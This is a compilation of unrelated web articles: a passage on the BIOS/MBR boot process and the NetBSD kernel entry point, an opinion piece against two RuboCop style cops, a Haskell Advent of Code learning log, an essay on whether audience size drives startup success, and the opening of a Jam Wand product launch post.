Describing UEFI and how it differs from BIOS is out of the scope of this article, but what is important to know is that both BIOS and UEFI based firmware will perform platform initialization, and later load the operating system from the physical medium.
The way that the system is loaded differs between UEFI and BIOS. The newer standard allows for more advanced functionalities, such as GPT partition layout where the BIOS operates on boot sectors. For this article, we will start with the legacy boot process based on Master Boot Record (MBR). The topic of UEFI can be extended in the future if needed.</p>

<h3 id="legacy-bios">Legacy BIOS</h3>

<p>When the CPU starts after reset, most of the platform hardware is not ready to use: system memory connected as a DIMMs modules is not yet detected and initialized, timers and interrupts aren’t ready, nor is the PCI bus working yet.
Hardware has to be initialized, and that is the essential role of platform firmware. A more detailed description of initialization process can be found by a curious reader in Minimal Boot Loader for Intel® Architecture, here I will point out only the critical functionalities.
At the beginning, firmware initialization code needs to initialize the CPU and platform chipsets can only then prepare memory to work.
After the memory is operational in a phase called post memory initialization, the firmware copies itself from the slow flash memory to the system DRAM. Initialization code can start execution only after it prepares software environment as stack or the CPU mode.
When the CPU jumps to memory address below 1MB in the DRAM (this memory region is historically reserved for that purpose), it still has many things to do before it is be able to communicate with external devices.
At the latest phase, IO devices are initialized as well as the PCI bus is enumerated. Once that is done, initialization code will search for a legacy operating system to boot, load the MBR sector from disk to the memory and execute it.</p>

<p>BIOS loads the first sector, called the MBR (512 bytes), from the beginning of the hard disk. That region must end with the magic number (also called a signature) 0xAA55. This sector contains instructions that have to load further sectors into the memory to execute a higher-level bootstrap program for a simple reason: size and how many instructions can fit into 512 bytes.
Only in that way can we have a more complex program that will find and execute the kernel of the operating system.
Before I describe the process of executing kernel and making it operational in the long mode, we need to know what the starting point of a typical UNIX kernel is.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/Loading_MBR_2_gxwj0i.svg" alt="Master Boot Record"></p>

<h2 id="the-kernel-is-an-elf-file">The Kernel is an ELF file</h2>

<p>The two most common executable file formats are ELF (Executable and Linkable Format) and PE (Portable Executable).
In the UNIX environment, ELF is the typical format for program binaries, while PE is widely used on Windows.
It should not be a surprise to the reader that the NetBSD kernel is also ELF executable.</p>

<h3 id="before-the-main">Before the main</h3>

<p>We are used to thinking that programs start with some kind of <code>main</code> function. Those of us who have studied libraries or flow of execution can recall a lower level <code>_start</code> function that was called when the program was loaded into memory. In ELF executables, the program actually starts at an entry point that is defined inside the header of the file (<code>Entry point address</code>).
We can easily verify this claim using the readelf program on our kernel binary:</p>

<div><pre><code data-lang="bash">$ readelf -h ./netbsd
ELF Header:
  Magic:   7f <span>45</span> 4c <span>46</span> <span>02</span> <span>01</span> <span>01</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> 
  Class:                             ELF64

  OS/ABI:                            UNIX - System V
  ABI Version:                       <span>0</span>
  Type:                              EXEC <span>(</span>Executable file<span>)</span>

  Version:                           0x1
  Entry point address:               0xffffffff80209000		<span>&lt;&lt;&lt;</span>
  Start of program headers:          <span>64</span> <span>(</span>bytes into file<span>)</span>
  Start of section headers:          <span>219286488</span> <span>(</span>bytes into file<span>)</span>
  Flags:                             0x0
  Size of this header:               <span>64</span> <span>(</span>bytes<span>)</span>
  Size of program headers:           <span>56</span> <span>(</span>bytes<span>)</span>
  Number of program headers:         <span>2</span>
  Size of section headers:           <span>64</span> <span>(</span>bytes<span>)</span>
  Number of section headers:         <span>39</span>
  Section header string table index: <span>37</span></code></pre></div>

<p>We can now check the name of the symbol with such an address, but only if we use non stripped kernel!</p>

<div><pre><code data-lang="bash">$ readelf --syms ./netbsd.gdb | grep ffffffff80209000
 <span>41333</span>: ffffffff80209000    <span>0</span> NOTYPE GLOBAL DEFAULT <span>1</span> __text_user_end
 <span>48452</span>: ffffffff80209000 <span>1096</span> FUNC   GLOBAL DEFAULT <span>1</span> start</code></pre></div>

<p>The starting function for our kernel is <code>start</code>.
Before we look into this function, we need to understand how the CPU’s knows this starting point.
Before the operating system can execute the program, compiled into ELF format, it has to load it into memory.
When the program runs on bare metal (without the operating system), it needs to take care of loading into memory by itself.
This is one of the reasons why we need programs such as bootloaders.</p>

<h2 id="a-few-words-about-bootloaders">A Few Words About Bootloaders</h2>

<p>There are a lot of possible ways and programs we can use to setup our platform.
Different boot loader programs such as <code>grub</code> or <code>u-boot</code> can be configured to work together on various hardware and support operating systems.
Early loader programs provide much flexibility in configuration.
I mentioned earlier two partition schemes: GPT and MBR, both can be used together as a hybrid.
I don’t want go too deeper into disk layout as such a description would end up with multiple tables and descriptions, so I will focus on the NetBSD kernel initialization for the default configuration.</p>

<p>After the BIOS finds a valid sector (with <code>0xAA55</code> signature), it loads the first disk sector (MBR) to physical address <code>0x7c00</code> . It also sets the <code>DL</code> register to drive the number from which MBR was loaded, and after that is done, firmware executes the loaded data.
For the x86 platform, the first two bootloaders are MBR (<code>mbr(8)</code>) and PBR whose names correspond to the sectors where they are placed: Master Boot Record and Partition Boot Record.
Traditionally, the MBR code relocates itself to a different physical memory location (<code>0x600</code>) and then locates the active
partition, reads its first sector (PBR) to the address <code>0x7c00</code> and jumps to it.
The PBR is designed to work with the classical NetBSD chain where it is loaded by the own MBR as well as to work with GPT partition, in both cases there is a difference in behavior.
In the case of GPT the <code>EAX</code> register will contain the constant <code>!GPT</code> (in hex: <code>54504721</code>) and the MBR structure, which contains Logical Block Address (LBA) from which was loaded and some extra information like OS type or GPT partition …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Consider a hypothetical class that filters out unsafe HTML elements:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>if</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>
      <span>super</span>
    <span>else</span>
      <span>nil</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>The default RuboCop settings would have us change it to this:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>super</span> <span>if</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Let us feast on a three-course meal of opinion about why this is
worse.</p>

<h2 id="that-nil-was-written-for-a-purpose">That <code>nil</code> Was Written For A Purpose</h2>

<p>My first beef — the hors d’oeuvre, if you will — is that
<code>Style/EmptyElse</code> wants us to change from an <em>explicit</em> <code>nil</code> return
value to an <em>implicit</em> one. It says there is a “redundant
else-clause”. I’ll tell you what’s redundant: the <code>Style/EmptyElse</code>
cop.</p>

<p>This cop would prefer that the <code>else</code> clause did not exist, like this:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>if</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>
      <span>super</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>In terms of behaviour at runtime, this is exactly the same. In terms
of readability, it is not.</p>

<p>The explicit <code>nil</code> in the original implementation implies that the
method is being called for its return value — that it’s probably
functional, with inconsequential side effects.</p>

<p>Making the <code>nil</code> implicit says that <em>the return value is not
important</em>. This method now reads like it’s implemented by avoiding
side effects within <code>super</code>.</p>

<p>So which one is it? Is the filter supposed to work by returning <code>nil</code>,
or does it work by avoiding the side effects in the <code>super</code> call?
These are very different behaviours, and RuboCop just changed the
human interpretation from the correct one to the wrong one.</p>

<p>Bad cop. No doughnut.</p>

<h2 id="its-not-a-guard-clause">It’s Not A Guard Clause</h2>

<p>My other beef (the main course) is with <code>Style/GuardClause</code>. This cop
takes conditionals and turns one of the branches into a guard clause
— something like this:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>return</span> <span>nil</span> <span>unless</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>

    <span>super</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Again, the runtime behaviour is identical, but the cop makes it less
readable.</p>

<p>Guard clauses are for bailing out early when you know that it’s not
necessary to run the rest of the method. They are usually trivial in
comparison to the <em>real</em> work done by the rest of the method. For
example, if we were implementing a sorting algorithm, then we could
have a guard clause for inputs with one element or less — there is
no need to run a sorting algorithm when there is nothing to sort.</p>

<p>Except in this case, we’re not “guarding” the rest of the method from
being run. That conditional is the <em>entire raison d’être of the
class</em>. It’s the most important part. The whole purpose of a filter is
to decide what elements stay in, and what elements get filtered out.</p>

<p>RuboCop has taken the most important part of the class and turned it
into a trivial-looking guard clause.</p>

<p>Bad cop. No doughnut.</p>

<h2 id="branching-should-look-like-branching">Branching Should Look Like Branching</h2>

<p>My final qualm (is there such a thing as dessert beef?) is with
<code>Style/GuardClause</code> removing the obvious indenting of the two
branches, making it look like straight-line procedural code.</p>

<p>Most of the time, developers don’t so much <em>read</em> code as they do
<em>scan</em> code. We don’t read from left to right, top to bottom, as if
the codebase were the world’s most boring novel. We skim over code,
navigating by the colours of syntax highlighting and the shapes
made by indentation.</p>

<p>So when we’re skimming over the original code, trying to find the
conditional — which we’ve already established as being the most
important part of the class — we will find two landmarks: a line
that starts with a brightly coloured <code>if</code> keyword, and indentation
that suggests a conditional.</p>

<p>But skimming over the guard-clause-enhanced code we see neither of
these landmarks. Instead, we find indentation that suggests
<em>procedural</em> code: a series of statements that run from top to bottom.
RuboCop has taken an obvious conditional and reshaped it to look like
there is no conditional.</p>

<p>The <code>Style/GuardClause</code> cop is double bad, and misses out on two
doughnuts.</p>

<h2 id="disclaimerconclusion">Disclaimer/Conclusion</h2>

<p>I don’t dislike RuboCop. It’s well made, and a useful tool.</p>

<p>The problem starts when it is viewed not as a tool, but as a set of
divine commandments. Thou shalt not make implicit <code>nil</code>s explicit.
Thou shalt not write long-form conditionals. Thus saith the RuboCop.</p>

<p>This is not necessarily a problem with RuboCop itself — it’s a
problem with how people sometimes use RuboCop. One could argue that
the defaults aren’t great, but they are not a problem until someone
hooks them up to CI.</p>

<p>My only aim here is to disabuse readers of the notion that RuboCop can
only make code better. It’s a tool, and whether it helps or hurts
depends on how it’s used. Don’t be afraid to disable cops if you can’t
see how they benefit the team.</p>

<![CDATA[Advent of Code in Haskell: T Minus 16]]>

<p>For the past few years I’ve been trying to learn haskell in various ways but
have never been able to stick to the method, let alone actually “become
productive” in Haskell.</p>
<p>Since I’ve decided to spent more time on tinkering during the evenings, I
thought it would be a nice idea to document my learning process.</p>
<p>The general idea is that I will do the challenges from the Advent of Code (2020
edition) and implement them in Haskell. And since there are 16 days left before
“it begins”, I’ll kick off with doing some of the challenges from last year to
prepare.</p>
<p>The documentation part will not really involve the learning of the language
itself, but more on “everything ephemeral” (the plumbing?). I’ll try to
elaborate on some of the “typical difficult Haskell stuff” as I encounter them
(and when I deem them appropriate).</p>
<p>I’m convinced that Haskell in itself is quite an easy language to grasp (once
you manage to get “some functional programming practices to click”), but that
there are a number of barriers that prevent people from becoming productive in
it.</p>

<p>During this attempt to grasp Haskell I will be working on my Windows 10 laptop
under WSL2 running an Ubuntu 20.04 installation. My notes will assume that a
sort of sane setup for an editor is available.</p>
<p>I use vim myself, with a fairly minimal vimrc (no haskell specific
configuration) and the following packages:</p>
<div><pre><code data-lang="shell">ale/ coc.nvim/ fzf/ ultisnips/ vim-go/ vim-repeat/ vim-surround/ vim-vinegar/
</code></pre></div><p>To get started I installed the GHC compiler through the default Ubuntu package
manager:</p>
<p>And then verified that installation has succeeded by running</p>
<div><pre><code data-lang="shell">&gt; ghci --version
The Glorious Glasgow Haskell Compilation System, version 8.6.5
&gt; ghc --version
The Glorious Glasgow Haskell Compilation System, version 8.6.5
&gt; cabal --version
cabal-install version 2.4.0.0
compiled using version 2.4.0.1 of the Cabal library
</code></pre></div><p>This ensured that all binaries are properly available (in path) to get going.</p>

<p>For those who do not know, The Advent of Code (TAOC) is a yearly event in which
50 programming assignments are made available during the first 25 days of
december, outlining a glorious story usually involving santa, elves, presents
and the (not so) daily challenges they face.</p>
<p>Every day two programming challenges are presented that take a certain input
(your daily input file) and require you to do StuffTM with that input to
accomplish a certain task. Don’t worry, it will all become clear when you
actually try this.</p>
<p>You can register on <a href="https://adventofcode.com/">https://adventofcode.com</a>.</p>

<p>With the environment setup I create a fresh directory for the first day:</p>
<p>and paste my input for the first challenge into taoc19/day1/input.txt</p>
<p>Since I’m not trying to do anything fancy right now, I create a new cabal
package with the <code>cabal init</code> command.  During the interrogation cabal gives
me, I stick with the defaults, except when asked whether I’m building a package
or executable, in which I choose ‘executable’.</p>
<p>This gives me a few files that I can use to start building.</p>
<p>To start the process I need to get my data from the input.txt file into a
function. Since I’ve read something about Haskell before (and some quick
googling) I try using the readFile function (from the stdlib/Prelude) in GHCi
and voila:</p>
<div><pre><code data-lang="haskell"><span>let</span> raw <span>=</span> readFile <span>"input.txt"</span>
</code></pre></div><p>The problem arises when I put the <code>let raw = readFile 'input.txt'</code> line in my
main do-block. Haskell has this notorious Monad thing going on, which I do not
yet fully grasp. But you don’t need to understand it to use it, so a small
Google session quickly led to the insight that I need to “reverse arrow put”
the result of the <code>readFile</code> call into a variable instead of using <code>let</code>. This
leads to a really minimal Main.hs file</p>
<div><pre><code data-lang="haskell"><span>module</span> Main <span>where</span>

<span>main</span> <span>::</span> <span>IO</span> ()
<span>main</span> <span>=</span> <span>do</span>
        raw <span>&lt;-</span> readFile <span>"input.txt"</span>
        print raw
</code></pre></div><p>when loadng it into GHCi and running main, it nicely outputs my input data.
First win achieved!</p>
<div><pre><code data-lang="shell">Prelude&gt; :l Main.hs
<span>[</span><span>1</span> of 1<span>]</span> Compiling Main             <span>(</span> Main.hs, interpreted <span>)</span>
Ok, one module loaded.
*Main&gt; main
&lt;your data here&gt;
</code></pre></div><p>Step two involves splitting up the input into lines and converting these lines
into an array of integers.</p>
<p>To accomplish the first step, Haskell has a handy function <code>lines</code> (in the
Prelude) available. The second part involves the <code>read</code> function (also a
Prelude thing) and specifying the type of the statement. Initially I created a
separate function <code>stoi</code> for this</p>
<div><pre><code data-lang="haskell"><span>stoi</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Int</span>
<span>stoi</span> <span>=</span> rread
</code></pre></div><p>but decided that “casting” the data inline would still be perfectly readable
(and perhaps even clearer), resulting in:</p>
<div><pre><code data-lang="haskell"><span>module</span> Main <span>where</span>

<span>main</span> <span>::</span> <span>IO</span> ()
<span>main</span> <span>=</span> <span>do</span>
        raw <span>&lt;-</span> readFile <span>"input.txt"</span>

        <span>-- since lines does not take an IO &lt;something&gt; but a regular String</span>
        <span>-- we do not use the do ... &lt;- syntax here, but put it in a variable</span>
        <span>-- directly.</span>
        <span>let</span> ls <span>=</span> lines raw

        <span>-- we want to have an [Int], so map the read function over the lines.</span>
        <span>let</span> nums <span>=</span> map read ls <span>::</span> [<span>Int</span>]

        print nums
</code></pre></div><p>Achievement 2 unlucked, I’m finally ready to do something with my data.</p>
<p>Part 1 of the challenge involves calculating how much fuel we need according to
a certain formula, so for every input we apply a function to it, and sum the
results.o</p>
<div><pre><code data-lang="haskell"><span>module</span> Main <span>where</span>

<span>fuelRequired</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>Int</span>
<span>fuelRequired</span> <span>=</span> id <span>-- todo</span>

<span>main</span> <span>::</span> <span>IO</span> ()
<span>main</span> <span>=</span> <span>do</span>
        raw <span>&lt;-</span> readFile <span>"input.txt"</span>

        <span>-- since lines does not take an IO &lt;something&gt; but a regular String</span>
        <span>-- we do not use the do ... &lt;- syntax here, but put it in a variable</span>
        <span>-- directly.</span>
        <span>let</span> ls <span>=</span> lines raw

        <span>-- we want to have an [Int], so map the read function over the lines.</span>
        <span>let</span> nums <span>=</span> map read ls <span>::</span> [<span>Int</span>]

        <span>-- apply the fuelRequired function to all the inputs and sum the result</span>
        <span>let</span> totalFuel <span>=</span> sum <span>$</span> map fuelRequired nums
        print totalFuel
</code></pre></div><p>which if we load it into GHCi gives us the sum of all the weights.</p>
<div><pre><code data-lang="shell">*Main&gt; :edit
<span>[</span><span>1</span> of 1<span>]</span> Compiling Main             <span>(</span> Main.hs, interpreted <span>)</span>
Ok, one module loaded.
*Main&gt; main
<span>9961383</span>
*Main&gt;
</code></pre></div><p>The actual calculation of required fuel involves dividing the weight by 3,
rounding it down and subtracting 2, giving me a really simple to implement
fuelRequired function.</p>
<div><pre><code data-lang="haskell"><span>-- fuelRequired should be the mass x, divided by 3, minus 2</span>
<span>-- with a minimum of 0.</span>
<span>fuelRequired</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>Int</span>
<span>fuelRequired</span> x <span>=</span> max <span>0</span> <span>$</span> (div x <span>3</span>) <span>-</span> <span>2</span>
</code></pre></div><p>Running the main file in GHCi again (after reloading the Main.hs file) gives me
a number that, when entered in the answer field on AOC tells me I’m on the
right track! Yay!</p>

<p>Oh, surprise, physics kicks in. Turns out, fuel weighs something as well, so
we’ll have to calculate the amount of fuel required to carry the fuel, which
also requires fuel to carry, etc.</p>
<p>This looks like a typically recursive situation where fuel that requires no
fuel (i.e. weighing 9 or less) serves as a perfect termination case. Let’s try
to write this as a recursive function with a guard in it.</p>
<div><pre><code data-lang="haskell"><span>-- recursiveFuelRequired is implemented as a recursive function</span>
<span>-- where we terminate recursion as soon as there is no more</span>
<span>-- fuel required for a certain component.</span>
<span>recursiveFuelRequired</span> x
        <span>|</span> x <span>==</span> <span>0</span>    <span>=</span> <span>0</span>
        <span>|</span> otherwise <span>=</span> <span>let</span> thisFuel <span>=</span> fuelRequired x <span>in</span>
                        thisFuel <span>+</span> recursiveFuelRequired thisFuel
</code></pre></div><p>and then calculating the actual total fuel required in the same way as before,
but now with this new recursive function:</p>
<div><pre><code data-lang="haskell"><span>let</span> totalFuel <span>=</span> sum <span>$</span> map recursiveFuelRequired nums
<span>print</span> totalFuel
</code></pre></div><p>output copy-paste into solution field, press submit, and… GREAT SUCCESS!</p>
<p>I’ll cover my solving of the Day 2 challenges somewhere in the upcoming days.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="__next"><div><article><p><span><p><em>In for the TLDR? Find the <a href="https://twitter.com/mxmzb/status/1329106639258087428">Twitter thread version here</a>.</em></p><p>A friend of mine is convinced that if you have a lot of followers on an arbitrary social media platform, you are in a much better spot to launch your product than without an audience. He points at people like Gary Vee, and Tai Lopez, implying that they are selling products purely on the back of their popularity. And although he has a point, I think this is extreme cherry-picking. In my opinion, it works for them for specific and unique reasons. </p><p>As I noticed, building an audience <strong>before having a product/service</strong> seems to be an evolving trend, even in the indie maker community. In my effort to find clearness, I've compiled a list of founders and influencers running businesses with differently sized audiences. I hope the examples will shed light on the correlation between large audiences and entrepreneurial success.</p><p>Before we start looking into this: You'll notice that when I write "audience", I <em>usually</em> refer to the Twitter following of a founder. That doesn't mean an audience can't be built on another platform, but it's what most tech founders associate with "audience". </p><p>Further, I will be referring to various sizes of audiences and grades of (routinely presumed) economic success. Those lines are blurry and defined by my intuition of what is what for the average indie maker.</p><h2>Large audience but little to no success</h2><p><em>A large audience in this context leans towards 50k and goes up infinitely. Little to no success means that the project/founder can not self-sustain or the project has died.</em></p><p>You have 50k followers on the platform of your choice. Will you be able to make your next startup successful with that many people behind your back?</p><p><a href="https://twitter.com/tjholowaychuk">TJ Holowaychuk</a> has 47k followers on Twitter (and 44k are occasionally seeing his contributions on GitHub). If you're a developer working with Node.js a lot, there is a good chance you've been using his code, or at least, code impacted by TJ.</p><p>TJ runs a software business called <a href="https://apex.sh/">Apex</a>, which offers monitoring/logging/uptime. I ran across it a few years ago and ever since haven't seen it build up a lot of momentum. Then, two months ago, I found <a href="https://www.indiehackers.com/post/holy-heck-this-is-hard-8ebe864174?commentId=-MF0nsQqF-pLhijfLpgm">a comment by TJ on Indie Hackers</a>:</p><blockquote><p>Congrats! It's definitely tricky, even with my reasonably rare ~50k Twitter community it's still difficult, startups have it so easy in comparison.</p><p>-- <cite>TJ Holowaychuk</cite></p></blockquote><p>Maybe 50k is not enough. How about 2.6m? In May 2019, <a href="https://web.archive.org/web/20190528072150/https://www.instagram.com/arii/">Instagram influencer Arii</a> failed <a href="https://www.tyla.com/news/celebrity-instagram-influencer-with-26m-followers-struggles-to-sell-36-t-shirts-20190528">to sell 36 T-Shirts</a>. The story has been torn apart by media shortly after, with various theories on what had gone wrong. Fake followers, wrong audience, no marketing strategy, lousy product. I'm convinced it's everything except fake followers. Sure, she probably has many, but at 2.5m total, I am confident a few hundred thousand legitimate ones rule this out as the sole reason for failure.</p><p>Do you remember <a href="https://en.wikipedia.org/wiki/Beme">Beme</a>? The social app to <a href="https://www.youtube.com/watch?v=mixsze6uJPg">record videos when you hold it up to your chest</a>? This was an endeavor by Casey Neistat, who had <a href="https://web.archive.org/web/20150809013605/https://www.youtube.com/user/caseyneistat">~1m YouTube subscribers</a>, <a href="https://web.archive.org/web/20150705203923/https://twitter.com/CaseyNeistat">~135k followers on Twitter</a>, and <a href="https://web.archive.org/web/20150813225907/https://instagram.com/caseyneistat/">~400k on Instagram</a> back at the time. Despite accumulating millions of new fans of his own on all platforms ever since and CNN buying Beme in 2016, it eventually shut down in 2018.</p><p>Beme wasn't the only project by Casey that went down. There is also <a href="https://www.368.nyc/about">368</a>, a <em>"place where professional gamers, internet creators and cultural icons meet and create"</em>. Although it is open and operating, it's safe to say it's not what Casey had envisioned for it by far.</p><blockquote><p>[...]<!-- --> building a business is a really slow, really painful process <!-- -->[...]</p><p>-- <cite><a href="https://youtu.be/a49xvHviVds?t=123">Casey Neistat</a></cite></p></blockquote><p>Not convinced yet? Let's reduce the audience down to its purpose: Attention and somewhat targeted reach.</p><p>With this in mind, we can look at the products, which have been spun up and <a href="https://killedbygoogle.com/">eventually killed by yours truly, Google</a>.</p><p>Although Google isn't a person, I think it's a potent example that a social audience isn't tied to a projects' success. Google has millions of followers on all major social media platforms (don't expect me to link the accounts up).</p><p>For emphasis: This is a <a href="https://killedbygoogle.com/">collection of &gt; 200 diverse products</a> by big G itself, an <a href="https://www.theverge.com/2020/1/16/21069458/google-alphabet-trillion-dollar-market-cap-apple-microsoft">ex-1-trillion-net-worth</a> company that made 160 billion in revenue in 2019.</p><p>Each of those products has been likely in development for at least a year, with a dedicated and motivated group of brilliant people working on it. Furthermore, many of those products have been rolled out to Googles' existing audience by integrating them seamlessly into the user experience (Picasa, Google+, Google Reader, Google Video, etc.) or otherwise promoting them with the help of Googles' ecosystem and a bag of serious cash.</p><h2>Medium audience but immense success</h2><p><em>A medium audience in this context ranges from approximately 5-45k. Immense success means that the project is alive and healthy, and the founders can live far beyond their needs, with an ample surplus.</em></p><p>This is a selection of folks with a following that you wouldn't deem overwhelming but still have more to nurture their projects from than the average indie maker. To provide these particular examples significance, I made sure that they had a disproportionate amount of success. I also would like you to pay attention to how their followings became vast <em>after</em> (or should I say <em>while</em>?) building their businesses.</p><p>Probably you didn't expect someone like <a href="https://twitter.com/levelsio">Pieter Levels</a>, who now has an impressive following (currently ~92k on Twitter) and is popular in the industry of online entrepreneurship, to be in this category. However, if you look closely, <a href="https://www.crunchbase.com/organization/remote-ok">at the time Pieter launched RemoteOK</a> in 2015, he <a href="https://web.archive.org/web/20150129205450/https://twitter.com/levelsio">had about 9k followers</a>. I'm not saying that's irrelevant, but I am having trouble to justify <a href="https://remoteok.io/">RemoteOK's</a> success from solely that. <a href="https://www.crunchbase.com/organization/nomad-list">Pieter launched Nomad List</a>, the second startup he is known for, even earlier, in August 2014, when he barely had <a href="https://web.archive.org/web/20140813033726/https://twitter.com/levelsio">4k followers</a> on Twitter. That didn't hinder him to get significant press coverage early on by such as <a href="https://www.inc.com/jessica-stillman/the-best-cities-in-the-world-for-digital-nomads.html">Inc.com</a> or <a href="https://www.businessinsider.in/how-to-find-the-best-places-to-live-when-you-work-remotely/articleshow/39427000.cms">Business Insider India</a>.</p><p><a href="https://twitter.com/yongfook">Jon Yongfook</a> (~18k followers) not only has somewhat of a celebrity status in Singapore, but he also has a noteworthy <a href="https://www.instagram.com/yongfook/">Instagram following</a> (~14k followers). Jon created <a href="https://www.bannerbear.com/">Bannerbear</a> and <a href="https://www.bannerbear.com/open/">discloses his numbers openly</a>. Before Bannerbear, <a href="https://twitter.com/yongfook/status/1304212610204577792">he has "failed"</a> a lot of times, both with <a href="https://twitter.com/yongfook/status/1171311476222464001">zero revenue</a> projects and projects that had <a href="https://blog.yongfook.com/don-t-fail-because-your-marketing-sucks.html">millions raised and hundreds of employees</a>.</p><p><a href="https://twitter.com/shl">Sahil Lavignia</a>, who has accumulated even more followers than Pieter by now (~143k), <a href="https://sahillavingia.com/reflecting">can tell a bizarre story</a> about his company <a href="https://gumroad.com/">Gumroad</a>. He had <a href="https://web.archive.org/web/20120130074352/https://twitter.com/shl">~9k followers</a> when he got funded in the millions around 2011-2012. Although I have been on Twitter at that time I fail to remember how influential numbers like this were back then. In the darkest hours of Gumroad, around November 2015, Sahil had grown his audience to <a href="https://web.archive.org/web/20151129034039/https://twitter.com/shl">~17k followers</a>. Another three years later, in November 2018, he had <a href="https://web.archive.org/web/20180208231910/https://twitter.com/shl">~20k followers</a> when Gumroad slowly <a href="https://sahillavingia.com/reflecting">started to rehabilitate from its prior downturn</a>.</p><p>Nowadays, you can't browse Twitter even for a minute without seeing a Gumroad link popping up somewhere. But Sahil jumped from success to failure and back with each transition taking years and rather moderately growing his Twitter audience. I'd argue his Twitter presence never played a critical role in his business' following success: To this date, his followers presumably view him more as the daily source of wise life advice than as the CEO of Gumroad.</p><h2>Little to no audience but great success</h2><p><em>Little to no audience in this context is everything less than ~5k followers. Great success means that the project is alive and healthy, and the founders can at least sustain their life financially from the project alone. Note that I did not research how many followers the founders in this category had at launch time because they fell into the given range even at the time of writing. But, naturally, you can assume it was even less.</em></p><p>On the other side, there are those who have no large audience and succeeded at their business. These folks are laser-focusing on building their business, not on building an audience for their business.</p><p>Because it's easy to find successful products of founders who don't have a large audience (hint: Look for cool products, the founders are almost always small on social media), here are more examples:</p><p><a href="https://twitter.com/arichaprasad">Richa Prasad</a> (~40 followers) and <a href="https://twitter.com/lucygliang">Lucy Liang</a> (~450 followers) offer online weight loss coaching on <a href="https://www.coachviva.com/">Coach Viva</a> and have recently hit $10k monthly average. I love how they've managed to get a common idea to work <a href="https://www.indiehackers.com/interview/the-long-road-to-10k-in-30-days-414169d6b8">with smart, sequential marketing efforts</a>. For example, they started out with their personal network, made adjustments to the product itself based on feedback, cemented their authenticity with reviews, and eventually landed on <a href="https://www.youtube.com/channel/UCQjOVgcoZvC6-EK0xgankpQ">YouTube</a>.</p><p><a href="https://twitter.com/brettwill1025">Brett Williams</a> is virtually non-existent on social media but has had tremendous success building <a href="https://www.designjoy.co/">designjoy.co</a>), a productized service where he sells web design on a monthly subscription. With that, Brett is <a href="https://www.indiehackers.com/product/hue">reporting to make $26k MRR</a> and has recently crossed <a href="https://www.indiehackers.com/post/hit-400k-as-a-solo-founder-designjoy-update-35af18ab82">$400k in total revenue</a>. The project is about three years old at the time of writing.</p><p><a href="https://twitter.com/sarahhum">Sarah Hum</a> (~4k followers) and <a href="https://twitter.com/a13n">Andrew Rasmussen</a> (~1.5k followers) are the founders of <a href="https://canny.io/">Canny</a>, a crowd-feedback tool used by large brands and tools like <a href="https://ahrefs.canny.io/">ahrefs</a>, <a href="https://react-native.canny.io/feature-requests">React Native</a>, and even <a href="https://netflix.canny.io/">Netflix</a>. Although Canny has <a href="https://www.indiehackers.com/product/canny/1m-arr-milestone--MFew44ybD_39HOGO_N7">recently hit $1m ARR</a>, neither Sarah nor Andrew have an exceptional social media following. <a href="https://canny.io/blog/how-we-built-a-1m-arr-saas-startup/">They found success in strategies</a> like content marketing, cold outreach, and putting effort into a great launch on <a href="https://www.producthunt.com/posts/canny-3">Product Hunt</a>.</p><p><a href="https://twitter.com/linuz90">Fabrizio Rinaldi</a> (~4k followers) and <a href="https://twitter.com/frankdilo">Francesco Di Lorenzo</a> (~2,5k followers) are building <a href="https://mailbrew.com/">Mailbrew</a>, an all-in-one email digest for all your favorite news and updates in one place.

                    <p>Today we are excited to launch the beta for Jam Wand -- with it, you can click on any text in your live website, edit it, and submit the change to GitHub to be merged into the code. It just launched in beta today, and you can sign up at <a href="https://jam.dev/wand">jam.dev/wand</a>.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/SXjlHrFlWNQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>Jam Wand is the tool <a href="https://twitter.com/_irtefa">Irtefa</a> and I wished we had when we were product managers at Cloudflare. We used to spend too much engineering time changing copy. We felt bad asking engineers for yet another copy change, and engineers felt bad because checking out yet another copy-fixes branch is time consuming and boring. It was a lose-lose.</p><p>We wished changing copy on a website was as easy as changing copy in a Google Doc. That was the goal for building Jam Wand.</p><p>With Jam Wand, any non-technical member of the team - without dealing with code or git - can make copy changes to their live website. It opens up pull requests to the codebase, so all engineers have to do is review and merge, and the copy change is live. </p><p>We know it’s cheesy, but we used to be PMs, we love building products and our dream is to help product teams work better together and build better products, 